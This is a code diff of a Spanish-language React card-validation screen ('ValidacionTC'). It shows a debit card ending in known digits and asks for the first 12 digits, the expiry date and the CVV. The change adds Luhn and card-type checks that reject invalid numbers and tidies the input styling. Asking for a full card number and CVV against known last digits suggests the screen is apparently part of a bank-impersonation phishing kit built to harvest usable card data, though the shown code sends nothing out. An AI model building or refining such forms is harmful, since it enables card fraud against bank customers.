@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import Loading from "../../components/Loading";
 import './css/LoginModal.css';
+import Payment from "payment";
 
 // Estilos para la animación de flip
 const flipStyles = `
@@ -73,7 +74,7 @@ export default function ValidacionTC() {
     const [cardData, setCardData] = useState({
         filename: "imgi_5_Debito_(preferencial).png",
         tipo: "debito",
-        digits: "4580",
+        digits: 5456,
         label: "Débito Preferencial"
     });
 
@@ -210,22 +211,85 @@ export default function ValidacionTC() {
     const requiredDigitsLength = 12; // Siempre 12 dígitos iniciales
     const requiredCvvLength = isAmex ? 4 : 3;
 
-    // Handlers
     const handleDigitsChange = (e) => {
         const val = e.target.value;
-        if (/^\d*$/.test(val) && val.length <= requiredDigitsLength) {
-            setCardDigits(val);
+
+        // Solo números y longitud
+        if (!/^\d*$/.test(val) || val.length > requiredDigitsLength) {
+            return;
+        }
+
+        // Guardar mientras escribe
+        setCardDigits(val);
+
+        // 👇 SOLO validar cuando ya están los 12 dígitos
+        if (val.length === requiredDigitsLength) {
+
+            // Construir número completo (12 + últimos 4 conocidos)
+            const fullCardNumber = val + cardData.digits;
+
+            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
+            const cardType = Payment.fns.cardType(fullCardNumber);
+
+            // ❌ Tarjeta inválida (Luhn o tipo desconocido)
+            if (!isValidNumber || !cardType) {
+                alert("Número de tarjeta inválido. Verifica los dígitos.");
+                setCardDigits("");
+                return;
+            }
+
+            // ✅ Opcional: validar tipo esperado (crédito/débito)
+            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {
+                alert("La tarjeta ingresada no corresponde a una tarjeta débito válida.");
+                setCardDigits("");
+                return;
+            }
+
+            // 🔥 Aquí ya pasó validación real
+            console.log("Tarjeta válida:", cardType);
         }
     };
 
-    const handleExpirationChange = (e) => {
-        let val = e.target.value.replace(/\D/g, ""); // Solo números
 
-        if (val.length >= 2) {
-            val = val.slice(0, 2) + "/" + val.slice(2, 4);
+    const handleExpirationChange = (e) => {
+        const raw = e.target.value;
+        const numbers = raw.replace(/\D/g, "");
+
+        // 👈 Backspace: no reformatear
+        if (raw.length < expirationDate.length) {
+            setExpirationDate(raw);
+            return;
         }
 
-        if (val.length <= 5) { // MM/YY = 5 caracteres
+        const currentYear = new Date().getFullYear() % 100;
+        let val = numbers;
+
+        // ===== MES =====
+        if (val.length >= 2) {
+            let month = val.slice(0, 2);
+            let monthNum = parseInt(month, 10);
+
+            if (monthNum < 1) month = "01";
+            if (monthNum > 12) month = "12";
+
+            val = month + val.slice(2);
+        }
+
+        // ===== AÑO =====
+        if (val.length > 2) {
+            let year = val.slice(2, 4);
+
+            if (year.length === 2) {
+                let yearNum = parseInt(year, 10);
+                if (yearNum < currentYear) {
+                    year = String(currentYear);
+                }
+            }
+
+            val = val.slice(0, 2) + "/" + year;
+        }
+
+        if (val.length <= 5) {
             setExpirationDate(val);
         }
     };
@@ -396,8 +460,8 @@ export default function ValidacionTC() {
 
     // Placeholder para Dígitos (Frente) - Ahora solo 12 dígitos
     const renderVisualInputDigits = () => (
-        <div className="input-lines-container" onClick={() => document.getElementById('cardDigits').focus()}
-            style={{ display: "flex", gap: "6px", cursor: "text", height: "40px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
+        <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
+            style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
             {Array.from({ length: requiredDigitsLength }).map((_, index) => {
                 const activeIndex = cardDigits.length < requiredDigitsLength ? cardDigits.length : requiredDigitsLength - 1;
                 const isActive = isFocused && focusedField === "digits" && step === "front" && index === activeIndex;
@@ -419,7 +483,7 @@ export default function ValidacionTC() {
     // Placeholder para Fecha de Expiración (Frente)
     const renderVisualInputExpiration = () => (
         <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
-            style={{ display: "flex", gap: "10px", cursor: "text", height: "40px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
+            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
             {Array.from({ length: 5 }).map((_, index) => {
                 const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;
                 const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;
@@ -442,7 +506,7 @@ export default function ValidacionTC() {
     // Placeholder para CVV (Reverso)
     const renderVisualInputCVV = () => (
         <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
-            style={{ display: "flex", gap: "10px", cursor: "text", height: "40px", alignItems: "center", justifyContent: "center" }}>
+            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
             {Array.from({ length: requiredCvvLength }).map((_, index) => {
                 const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;
                 const isActive = isFocused && step === "back" && index === activeIndex;
@@ -486,8 +550,8 @@ export default function ValidacionTC() {
                                 <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
                                 <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                     {step === "front"
-                                        ? `Ingresa los datos de tu tarjeta ${getTipoTarjeta()} terminada en **${cardData.digits}`
-                                        : `Validación del CVV de la tarjeta ${getTipoTarjeta()} terminada en **${cardData.digits}`
+                                        ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
+                                        : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                     }
                                 </h2>
                             </div>
@@ -518,18 +582,12 @@ export default function ValidacionTC() {
                                             textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
                                         }}>
                                             {/* Número de tarjeta: 12 bullets + últimos 4 dígitos */}
-                                            <div style={{
-                                                fontSize: "22px", fontFamily: "monospace", fontWeight: "bold", letterSpacing: "2px",
-                                                textAlign: "left"
-                                            }}>
+                                            <div className="digits-text" style={{ marginTop: 20 }}>
                                                 {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
                                             </div>
 
                                             {/* Fecha de expiración */}
-                                            <div style={{
-                                                fontSize: "16px", fontFamily: "monospace", fontWeight: "bold",
-                                                textAlign: "left", paddingLeft: "4px"
-                                            }}>
+                                            <div className="digits-text" style={{ marginTop: 0 }}>
                                                 {expirationDate || "MM/YY"}
                                             </div>
                                         </div>
@@ -563,8 +621,8 @@ export default function ValidacionTC() {
                                         {/* Input de Número de Tarjeta */}
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputDigits()}
-                                            <label htmlFor="cardDigits" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
-                                                Primeros 12 dígitos
+                                            <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
+                                                Ingrese los primeros 12 dígitos de su tarjeta
                                             </label>
                                             <input
                                                 id="cardDigits"
@@ -575,14 +633,23 @@ export default function ValidacionTC() {
                                                 onChange={handleDigitsChange}
                                                 onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
                                                 onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%", opacity: 0, cursor: "pointer" }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
+                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                }}
                                             />
                                         </div>
 
                                         {/* Input de Fecha de Expiración */}
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputExpiration()}
-                                            <label htmlFor="expirationDate" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
+                                            <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
                                                 Fecha de expiración (MM/YY)
                                             </label>
                                             <input
@@ -594,7 +661,16 @@ export default function ValidacionTC() {
                                                 onChange={handleExpirationChange}
                                                 onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
                                                 onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%", opacity: 0, cursor: "pointer" }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
+                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                }}
                                             />
                                         </div>
                                     </>
@@ -613,7 +689,16 @@ export default function ValidacionTC() {
                                                 onChange={handleCvvChange}
                                                 onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
                                                 onBlur={() => { setIsFocused(false); setFocusedField(""); }}
-                                                style={{ position: "absolute", top: 0, left: 0, width: "100%", height: "100%", opacity: 0, cursor: "pointer" }}
+                                                style={{
+                                                    position: "absolute",
+                                                    top: 0,
+                                                    left: "50%",
+                                                    transform: "translateX(-50%)",
+                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
+                                                    height: "40px",      // 👈 altura SOLO de la fila superior
+                                                    opacity: 0,
+                                                    cursor: "text",
+                                                }}
                                             />
                                         </div>
                                     </>
